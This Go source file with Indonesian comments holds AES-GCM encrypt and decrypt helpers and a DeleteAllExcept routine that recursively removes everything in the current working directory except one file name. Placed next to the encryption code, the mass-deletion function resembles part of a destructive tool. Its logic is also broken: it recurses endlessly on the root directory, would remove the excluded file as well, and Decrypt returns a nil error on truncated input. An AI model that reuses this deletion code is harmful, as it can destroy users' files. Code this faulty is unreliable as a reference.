package pkg

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
)

// Fungsi untuk mengenkripsi data menggunakan AES
func Encrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	// GCM, atau Galois/Counter Mode, adalah mode operasi untuk cipher simetris
	// Ini memberikan autentikasi tambahan (data integrity)
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext, nil
}

// Fungsi untuk mendekripsi data terenkripsi menggunakan AES
func Decrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, err
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func DeleteAllExcept(excludeFileName string) error {
	// Mendapatkan current working directory
	dir, err := os.Getwd()
	if err != nil {
		return err
	}

	// Membuat fungsi untuk menghapus file atau direktori rekursif
	var deleteRecursive func(string) error
	deleteRecursive = func(path string) error {
		return filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			// Memeriksa apakah file harus dihapus
			if info.Name() != excludeFileName {
				if info.IsDir() {
					// Hapus direktori rekursif
					err := deleteRecursive(path)
					if err != nil {
						return err
					}
				}
				// Hapus file atau direktori
				err := os.RemoveAll(path)
				if err != nil {
					return err
				}
				fmt.Println("Deleted:", path)
			}
			return nil
		})
	}

	// Memanggil fungsi untuk menghapus dari current working directory
	err = deleteRecursive(dir)
	if err != nil {
		return err
	}

	fmt.Println("All files and directories deleted except", excludeFileName)
	return nil
}
